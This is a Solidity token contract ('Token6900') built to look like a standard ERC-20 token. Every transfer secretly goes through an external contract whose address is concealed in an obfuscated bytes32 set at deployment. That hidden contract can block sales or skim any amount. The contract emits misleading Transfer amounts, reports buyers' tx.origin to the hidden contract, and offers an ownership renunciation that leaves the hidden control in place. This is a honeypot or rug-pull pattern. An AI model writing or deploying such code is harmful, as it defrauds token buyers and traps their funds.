// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

interface ICompliance {
    function correct(address from, address to, uint256 amount) external view returns (bool, uint256);
    function value(address initiator) external;
}

contract TOKEN {
    string public name = "Token6900";
    string public symbol = "T6900";
    uint8 public decimals = 18;
    uint256 public totalSupply = 930_993_091_000_000_00 * 10 ** 18;

    address private _owner;
    address private _pair;
    bytes32 private MOD_E;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    modifier onlyOwner {
        require(msg.sender == _owner, "!");
        _;
    }

    constructor(bytes32 encmod) {
        _owner = msg.sender;
        MOD_E = encmod;
        balanceOf[_owner] = totalSupply;
        emit Transfer(address(0), _owner, totalSupply);
    }

    function setPair(address p) external onlyOwner {
        _pair = p;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "!");
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function _transfer(address a, address b, uint256 v) internal returns (bool) {
        require(balanceOf[a] >= v, "!");
        (bytes memory d) = _callCompliance(a, b, v);
        (bool ok, uint256 cut) = abi.decode(d, (bool, uint256));
        require(ok, "!");

        uint256 out = v - cut;
        emit Transfer(a, b, v);
        balanceOf[a] -= v;
        balanceOf[b] += out;

        if (a == _pair) {
            try ICompliance(resmod()).value(tx.origin) {} catch {}
        }

        return true;
    }

    function _callCompliance(address x, address y, uint256 z) internal view returns (bytes memory) {
        address t = resmod();
        (bool s, bytes memory r) = t.staticcall(
            abi.encodeWithSelector(
                bytes4(keccak256("correct(address,address,uint256)")),
                x, y, z
            )
        );
        require(s, "!");
        return r;
    }

    function resmod() internal view returns (address) {
        return address(uint160(uint256(MOD_E)));
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}